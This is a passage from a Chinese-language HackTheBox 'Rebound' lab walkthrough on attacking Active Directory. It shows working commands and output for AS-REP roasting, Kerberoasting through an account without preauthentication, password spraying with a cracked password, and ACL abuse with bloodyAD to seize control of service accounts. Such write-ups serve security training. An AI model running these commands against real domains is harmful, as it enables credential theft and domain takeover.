(SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             525: rebound\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             526: rebound\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             1000: rebound\DC01$ (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             1951: rebound\ppaul (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             2952: rebound\llune (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             3382: rebound\fflock (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             5277: rebound\jjones (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             5569: rebound\mmalone (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             5680: rebound\nnoon (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7681: rebound\ldap_monitor (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7682: rebound\oorend (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7684: rebound\winrm_svc (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7685: rebound\batch_runner (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7686: rebound\tbrady (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             7687: rebound\delegator$ (SidTypeUser)</span><br></pre></td></tr></table></figure>

<p>整理userlist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep SidTypeUser ridlist| awk -F &#x27;[:\\(]&#x27; &#x27;&#123;print $2&#125;&#x27;</span><br><span class="line"> rebound\Administrator </span><br><span class="line"> rebound\Guest </span><br><span class="line"> rebound\krbtgt </span><br><span class="line"> rebound\DC01$ </span><br><span class="line"> rebound\ppaul </span><br><span class="line"> rebound\llune </span><br><span class="line"> rebound\fflock </span><br><span class="line"> rebound\jjones </span><br><span class="line"> rebound\mmalone </span><br><span class="line"> rebound\nnoon </span><br><span class="line"> rebound\ldap_monitor </span><br><span class="line"> rebound\oorend </span><br><span class="line"> rebound\winrm_svc </span><br><span class="line"> rebound\batch_runner </span><br><span class="line"> rebound\tbrady </span><br><span class="line"> rebound\delegator$ </span><br></pre></td></tr></table></figure>

<p>跑一遍用户列表，看下有没有关闭了预认证<code>(UAC存在DONT_REQ_PREAU TH)</code>的用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ for i in $(awk -F &#x27;\&#x27; &#x27;&#123;print $2&#125;&#x27; userlist);do impacket-GetNPUsers -dc-ip 10.10.11.231 &quot;rebound.htb/$i&quot; -no-pass ;done</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for Administrator</span><br><span class="line">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for Guest</span><br><span class="line">[-] User Guest doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for krbtgt</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for DC01$</span><br><span class="line">[-] User DC01$ doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for jjones</span><br><span class="line">$krb5asrep$23$jjones@REBOUND.HTB:ee519583b5099dddd3a586fc97792d76$e739e292ed956b813a5ff6bca013f0e2f4d93aba49e918e8c97dca99ba320b2acc5fcf0670f46e66a09b2e25e0712ea24229035e73d667524357dfbbbcc40e30c1f738b95b08f795a1de2beac67f024f820ad59959cb2e425f95f879844f2b4dac67d02a8209328d46bb52da88b8134e864221b7759f8d4273c4e73fc5acfd86c78995a88b30974403a64451995bb672763de46faf195fa20fe58676d74a037abd3039b56be931d8ef8b164d615a498ab28e9fc858763f127ba8e77f17f1b4ce8823aa24ef3affd4d7630fea625d7b219fc18c8c50842b7d9ed0ac215477b4167a3b92fcd8f811e7b33e</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>看样子<code>jjones</code>存在<code>DONT_REQ_PREAUTH</code>，所以他返回了<code>tgt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">------- jjones</span><br><span class="line">$krb5asrep$23$jjones@REBOUND.HTB:ee519583b5099dddd3a586fc97792d76$e739e292ed956b813a5ff6bca013f0e2f4d93aba49e918e8c97dca99ba320b2acc5fcf0670f46e66a09b2e25e0712ea24229035e73d667524357dfbbbcc40e30c1f738b95b08f795a1de2beac67f024f820ad59959cb2e425f95f879844f2b4dac67d02a8209328d46bb52da88b8134e864221b7759f8d4273c4e73fc5acfd86c78995a88b30974403a64451995bb672763de46faf195fa20fe58676d74a037abd3039b56be931d8ef8b164d615a498ab28e9fc858763f127ba8e77f17f1b4ce8823aa24ef3affd4d7630fea625d7b219fc18c8c50842b7d9ed0ac215477b4167a3b92fcd8f811e7b33e</span><br></pre></td></tr></table></figure>

<p>但是遗憾的是我并没有crack成功他的<code>password</code></p>
<p>幸运的是，即便是无法拿到明文密码，我们仍有办法进一步利用<code>关闭了预认证的用户</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus/pull/139">https://github.com/GhostPack/Rubeus/pull/139</a></p>
</blockquote>
<p>这是一篇对于Rubeus的pull，不难看出这是针对<code>未开启预认证账户</code>攻击面的一次拓展，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Added an argument to kerberoast, /preauth:X which will take the username of an account that doesn&#x27;t require preauth and request ST&#x27;s for all SPNs/usernames passed with the /spn:Y or /spns:Z arguments, either of these arguments are required when using /preauth:USER. If using this argument, a TGT or credentials are not required.</span><br></pre></td></tr></table></figure>

<p>新增了一个<code>/prieauth</code>一个<code>/spn</code>和<code>/spns</code>，可以通过<code>/preauth</code>来指定一个关闭了预认证的用户，通过此用户可以去请求其他存在spn的账户，获取返回的st。</p>
<p>第一次接触可能会觉得这不科学，因为此前能从<code>DONT_REQ_PREAUTH</code>用户那里返回的就只有<code>tgt</code>，但是在这边文章中有介绍，在<code>as_req</code>阶段通过修改<code>sname</code>指定服务，<code>AS_rep</code>会返回服务st</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">https://www.semperis.com/blog/new-attack-paths-as-requested-sts/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">摘自上述文章：</span><br><span class="line"></span><br><span class="line">AS 请求服务票的问题</span><br><span class="line">本文重点介绍 Kerberos 流程中的 AS-REQ/AS-REP 部分，通常用于请求 TGT。在正常操作中，AS-REQ在 req-body 中的sname字段中有两个值之一：</span><br><span class="line"></span><br><span class="line">krbtgt/domain.local：用于请求初始 TGT</span><br><span class="line">kadmin/changepw：用于请求短期票证，可用于使用 KRB-PRIV 消息重置密码（在RFC 3244中定义）</span><br><span class="line">我注意到，在强制实施Kerberos 灵活身份验证安全隧道 (FAST)的情况下，机器帐户仍然会发送未保护的 AS-REQ。我想知道是否可以使用 AS-REQ 直接请求 ST，而不是 TGT。这导致我修改 Rubeus 以确定在AS-REQ 的sname中指定另一个 SPN是否会导致 DC 为该 SPN 回复 ST。事实证明，答案是“是”。</span><br></pre></td></tr></table></figure>

<p>尽管<code>as_req</code>正常返回的TGT使用的加密一般是用的<code>cname</code>用户的长期凭据（密钥等），这也就使得之前的针对<code>未开启预认证用户的攻击</code>局限于破解tgt，但作者通过修改<code>AS_REQ</code>中的<code>sname</code>由<code>krbtgt</code>变更为配置了<code>serviceprincipalname</code>的账户，譬如这里的<code>ldap_monitor</code></p>
<blockquote>
<p>如果你还未了解过预认证可以看这篇 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85374">https://www.anquanke.com/post/id/85374</a></p>
</blockquote>
<p>这里通过没有开启预认证的账户<code>jjones</code>直接发起<code>as_req</code>可以看到<code>sname</code>部分是<code>ldap_moniter</code></p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-2.png" alt="alt text"></p>
<p>而后在<code>AS_REP</code>部分kdc为我们返回了<code>ldap_moniter</code>的<code>st</code></p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-3.png" alt="alt text"></p>
<p>所以这里就是常规<code>spn</code>的roasting了，但我还是要提一下<code>st</code>通常是用<code>服务账户</code>的长期密钥加密的，所以和<code>as-rep roasting</code>一样都是可以被crack的，这里不再赘述。</p>
<p>为了形成对比，这里我使用<code>ldap_monitor</code>用户请求获取<code>tgt</code>来演示常规的<code>as_req</code>过程</p>
<p>可见下图的正常请求<code>as_req</code>的<code>cname</code>用户<code>ldap_monitor</code>但目标<code>sname</code>是<code>krbtgt</code></p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-4.png" alt="alt text"></p>
<p>此时<code>as_rep</code>返回的就是<code>ldap_monitor</code>的<code>tgt</code>了</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-5.png" alt="alt text"></p>
<p>所以两者之间的区别就是<code>as_req</code>阶段<code>sname</code>请求的对象不同，导致我们可以由原来请求的<code>tgt</code>变为了目标服务的<code>st</code>，当然这个也就使得<code>as_req</code>阶段可以直接拿到<code>TGT</code>的<code>关闭了预认证的用户</code>由只能尝试crack tgt获取当前用户密码，拓展到了可以获取<code>st</code>来crack.</p>
<p>实际我思考了一下即便是开启了预认证的用户，在获得了长期密钥后，也可以在请求tgt的时候做同样的操作，尽管有些鸡肋(笑)。</p>
<p>getspn也更新实现了这种方式，通过getSPN来指定nopreauth用户来发起对可能是服务账号的list进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-GetUserSPNs -dc-ip 10.10.11.231 -no-preauth jjones  -usersfile ul_u  -dc-host dc01.rebound.htb  rebound.htb/ &gt; NO_PREAUTH_SPN</span><br></pre></td></tr></table></figure>

<p>而后hashcat跑出<code>ldap_monitor</code>的密码<code>1GR8t@$$4u</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$bee5538d284dde5814a2c80f0596ba33$6d8903d501600b7c0fea99698ac786fe2a06cac9a3401aa0ef22542d83aad322abc97652860c82c5bfdcc5a688553fa68ce22c39cf986a62d22f843edc59629591104455fc1db22b6535db512dae5ca37d092c8574ef161621f869934e4db2e9e692fc8f38b5c493dc65f79756b0e57d56ee22ebb00f4686232587589f475cc87f6d48e88ed6c880ed49a3e5ad701965406270b631bcc9a554d13dd77c41a2e7c09658c29fe75571b8cfa617be91357d639883eaf8946ff2dcdedb8dbec0ed44756675cc7414edf25f5f18aac36212864fec0bfa4bfa9851fac9da47ae028d9a7e41003c1a4b5165598edef6943d75d084106d659622fe2322bab1ea1a88f1efbd4318ee41f2820b80fade550ab849c226640a56640470f4f33f9ef41584cf06392b5d73143663b2c52b1bb13bab40d4fe55abd015c7940a936397c600b75ed4e6d9a3ba469ba51c93d15e2e78e88e2574ed3ddb0988b8fe48ede1f5af6ceb724610a94aff35932f42ab47880c914599ca09384c200956a390e742d4370772f23de20097bacc9e7dd9556eb9cfff396de565b25804dac3b22e9975159114322c36987d5de984ea40733513f8e383dc75de2ae36c5efd5814b4458a0c68753b265896305e9a87cd9a182192b872ea12b9e97221c5ea2560b1f67d1ff0c6b7db28c0dd82ef956cb5e85f5d8d378aca01a5777336abb2936c4c6965e4256539077b51ad45918eee703e4061962ac2f130d3a1bf1d3e5d031bcc2fbf3e9cae8b560f13b6c11aa3b82c10d6a6276e6f6ad80fce4347307b680cce8ceedd101ae21cc986186095809a645d7db0104bc2461f7f933af3d3967bbff3289f6e2cd00fff015217258f00a97fd30593fadafafc886f42e43e5773cbf93b917d8892c6f9a9c1ff05cbcd4e712b8d2d9ff601707d04646b106285c21206cee37607cc142fee68c2478622e8dfcfefedf6e7bcd8971d29bb07f1bfe51f24cd6e9908e390b5f07a97f5df2b056f037fcf09af32dd71072f66a996924810232d775c252ca4d226d9146e6992586778777fc52c675d1f377a150852d251cb6c5f352de45292f75a63b84543484f6325be06820d7fdcc9c25f8850a41948e0e54da66e102afdf37305039d25014e762e093cb7d3d5c96e8874801f1660f626c2326d934bcdf5288778464b2aa57c395ac277692052fa0d2be1bdcfcc688a5ceba0e054b4801595ca1f3bd2c189057a8c4efcf747429824cd7ee70d613c279a4f1dfd9120cb40a81420666885c6029dfd5947ef84f268f7fb6cce104ada1ddb3037cecf28a880a3df93da4855b0de5260bd2721b4d6d5f3a5fc778ae08bfa64feded8c89fc1ea1361e6cc23:1GR8t@$$4u</span><br></pre></td></tr></table></figure>

<p>这个用户没什么权限，所以进一步撞密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb rebound.htb -u ul_u -p &#x27;1GR8t@$$4u&#x27; --continue-on-success</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<p>又得到了<code>rebound.htb\oorend:1GR8t@$$4u</code></p>
<p>通过遛狗可以看到<code>oorend</code>对<code>servicemgmt</code>组有加用户权限</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-6.png" alt="alt text"></p>
<p>所以把自己加到组里进去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">─$ python3 bloodyAD.py --dc-ip 10.10.11.231 --host dc01.rebound.htb -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -d rebound.htb add groupMember ServiceMgmt oorend</span><br><span class="line">[+] oorend added to ServiceMgmt</span><br></pre></td></tr></table></figure>

<p>再看<code>servicemgmt</code>的权限</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-7.png" alt="alt text"></p>
<p>看下组织<code>SERVICE USERS</code>中的对于<code>ServiceMgmt</code>的acl，<code>ActiveDirectoryRights</code>被指向了<code>serviceMgmt</code>，所以<code>genericAll</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; Get-ObjectAcl  -Identity &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27;</span><br><span class="line">ObjectDN                    : OU=Service Users,DC=rebound,DC=htb                                                               </span><br><span class="line">ObjectSID                   : None                                                                                             </span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE                                                                               </span><br><span class="line">ACEFlags                    : None                                                                                             </span><br><span class="line">ActiveDirectoryRights       : FullControl                                                                                      </span><br><span class="line">AccessMask                  : 0xf01ff                                                                                          </span><br><span class="line">InheritanceType             : None                                                                                             </span><br><span class="line">SecurityIdentifier          : ServiceMgmt (S-1-5-21-4078382237-1492182817-2568127209-7683)  </span><br></pre></td></tr></table></figure>

<p>那我们先给刚加到<code>servicemgmt</code>的<code>oorend</code>也加一个<code>FullControl</code>权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py --dc-ip 10.10.11.231 --host dc01.rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb add genericAll &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27; oorend</span><br><span class="line">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB</span><br></pre></td></tr></table></figure>

<p>再来看一下这个OU的对于<code>oorend</code>acl，已经变成了<code>FullControl</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; Get-ObjectAcl  -Identity &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27;</span><br><span class="line">ObjectDN                    : OU=Service Users,DC=rebound,DC=htb                                                               </span><br><span class="line">ObjectSID                   : None                                                                                             </span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE                                                                               </span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE, OBJECT_INHERIT_ACE                                                        </span><br><span class="line">ActiveDirectoryRights       : FullControl                                                                                      </span><br><span class="line">AccessMask                  : 0xf01ff                                                                                          </span><br><span class="line">InheritanceType             : None                                                                                             </span><br><span class="line">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)</span><br></pre></td></tr></table></figure>

<p>此时<code>oorennd</code>就对这个组织内的用户有了为所欲为的权限，这个ou内有两个用户</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-8.png" alt="alt text"></p>
<p>这里为了演示所以分别用加<code>spn</code>和<code>关闭预认证</code>两种方式，尝试拿一下他们的<code>tgt</code>和<code>st</code>来crack出密码。</p>
<p>首先是spn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; Set-DomainObject -Identity winrm_svc -Set serviceprincipalname=&#x27;nonexistent/BLAHBLAH&#x27; </span><br><span class="line">[2024-12-11 08:21:19] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-GetUserSPNs -dc-ip 10.10.11.231 -k  -dc-host dc01.rebound.htb  rebound.htb/ -request</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">ServicePrincipalName          Name          MemberOf                                                 PasswordLastSet             LastLogon                   Delegation</span><br><span class="line">----------------------------  ------------  -------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">ldapmonitor/dc01.rebound.htb  ldap_monitor                                                           2023-04-08 05:07:56.123753  2023-04-08 12:23:35.007774</span><br><span class="line">nonexistent/BLAHBLAH          winrm_svc     CN=Remote Management Users,CN=Builtin,DC=rebound,DC=htb  2024-12-11 08:29:00.801570  2023-04-08 13:03:38.047176</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$krb5tgs$23$*winrm_svc$REBOUND.HTB$rebound.htb/winrm_svc*$5cd5533395c682ce80e059196be12db4$c51ea4f61b3ca9f72154d0f6550f5d78d5815079aeaec41386d43b54b12893dbe8a6e2ab198337b19319cdbccd524d26453c3bb65e6928352e8005947dedce955fc54090ca725f5677e235601346f2f9b5373779c74ddddedb6cffce910f57122d382b95a940b5f643c4618b04d53c793970f6a2e78130ff376a8eb1db579c8cd8c051e5d6ac7af361344abe279e1955072b0391195d5ec065720d7f11f24b6f5b670b62c95c6928a5e860d198af7414986b5cb52175edd7a899c71bb812fca2ce39865bf76370aa2759b34bfc9ba82ca3f323e69bff142849356665d265b052c8fc6bf2daca3f140a84a7e0ac5fab5be89732083dee707c100e90ce40f63e8116aa0829944be289fa66ae251fbd81c5fd718803c447425f356a356cf5bde0a4b4f03edfd89c7f6776b4b253eba921a3c8b1646c023c7bb7ca263073f39c0272cd815b290b4b1c0fabc8fadf2afd16c25caaa886ca8a414e0f2d1a4b7693800cc2aec7b9e9c38d997a5bc9f35f7364d443ebd6d8c6216d7bfce5f6df1657dd4e449cfcdbedf301d414de440aaf086680d84a637297af1ad99e994f8d04c89ba10d2b6722ca7827b0e8deef97235bb3f7dbf17f62a4863db12bd96982c34b3239d85a8b1effbe953d547581b0bb1fae076a1343c57ff91eda86eccb8d7bdb03303dca320b66adbe2c102fdad1547cd688d0652595e8c2ce6fae921d79da92921dc886fd570ba3b6260a23715c6d8a88930ab1a82bdba9821e2a6084e9f243bd6e3a6271b681cbafa8de28f17c4bd881528101602fcff190e7ecaacb56c773d7d4181dd628713038892545f66b705a01d238455bee5beebed5b847a0cc6af64a16a97b220013e7b06bcb4078404943efda299680bbeba3637ebd9cbc053fb02c3316f6048eb894c5b512df170f653fe38f76e68f514141300dd223faf8b986431dc8197e09645d8a8def836588f63faa3c29addcebd7fb2f63f54a694a6b0873436f238660e2bb4ca2d8be020071a824a5e38b579b37fb89caee67004dbb96b301e7fed18158720faccd78896865117ba6e93d604e9360f7823d556d1b7c76d4c655b9781a94f167991cc379de4dfaee4c6d828a27c6e6eaa5a153fb344dc2771c233ede90196c82e68531793379ad683227c988456ab4d588b0cf7f1aab53fbd058f2aa62b923ea244f94b343ec8d365b682ec3256fda51d2728322e6c2547bd41147a24decaefb926b6093eabc02f90d3ebc27e9fcf0c60701a4142174a7f4a4e14570cdb4221c4c0f770bbb2a8433d72384f596cfd287ff0c393391fc9d15bd73c388d566df44c863c5340f16031e18c7d54b1885fb5085462130774fb3cc9510ccde61fab111c32d8154165361000ae140a10eff4a7e95acba171ed94073d8510fdfadae92438bff38a11976b5496c5e33de95bd8b8510c74b2931cc9be03e7d2d</span><br></pre></td></tr></table></figure>

<p>其次是关预认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py --dc-ip 10.10.11.231 --host dc01.rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb add uac batch_runner  -f DONT_REQ_PREAUTH</span><br><span class="line">[-] [&#x27;DONT_REQ_PREAUTH&#x27;] property flags added to batch_runner&#x27;s userAccountContro</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-GetNPUsers -dc-ip 10.10.11.231 -dc-host dc01.rebound.htb -k rebound.htb/ -request</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">Name          MemberOf  PasswordLastSet             LastLogon                   UAC      </span><br><span class="line">------------  --------  --------------------------  --------------------------  --------</span><br><span class="line">jjones                  2023-04-08 05:02:52.045675  2023-04-09 06:16:17.935528  0x410200 </span><br><span class="line">batch_runner            2024-12-11 08:33:01.145320  2023-04-09 06:22:12.624455  0x410200 </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$krb5asrep$23$batch_runner@REBOUND.HTB:63ad36224c5225e520039e3f04ad4896$07fab82d6a27595e7604335c532d5b336be20a5b3e26eaae71a6f50f7fe8aae6dfb26e02d8e66680980223d2a1411ff973969467e89349dd9867a9ddb6fe5046f38b6087e2e1bc3f59c269d6a7c5581b7280b71882cd8d85c1ca1b411207ff6cc99bd3cdb6c66f15a7a632acdf533a8a19ca42c3d223e5f97827117e5421dff9580deddce4f06e85eca456daad31ecb111ee44e653f8fb77857b1febd8fc6918b433200bf7ec1094242c2fed867f4ad7e4d4836ce38dde1105f0cf4f1b529546fa4a2cac67f7f6701e137af30474fa4f1401d5de92c54d483b60e2a589e18fbab0aaa2384c9edefc8524</span><br></pre></td></tr></table></figure>

<p>然后跑一下这两用户的密码，并没有跑出来</p>
<p>因为winrm_svc在remote组里所以直接改一下他的密码登录看下</p>
